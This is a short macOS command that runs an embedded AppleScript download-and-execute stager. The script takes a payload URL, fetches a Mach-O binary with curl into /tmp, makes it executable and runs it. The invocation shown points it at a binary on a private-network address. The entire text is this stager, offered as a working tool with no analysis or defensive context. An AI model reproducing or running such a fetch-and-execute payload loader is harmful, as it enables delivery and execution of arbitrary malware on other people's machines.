osascript -e 'on run argv

    if (count of argv) < 1 then

        display dialog "Usage: osascript -s s -- <payload_url>"

        return

    end if


    set payloadURL to item 1 of argv

    set localPath to "/tmp/hello"


    -- Download Mach-O from URL

    do shell script "curl -s -o " & quoted form of localPath & " " & quoted form of payloadURL


    -- Make it executable

    do shell script "chmod +x " & quoted form of localPath


    -- Run the binary

    do shell script quoted form of localPath

end run' "http://192.168.1.26/hello_macho"
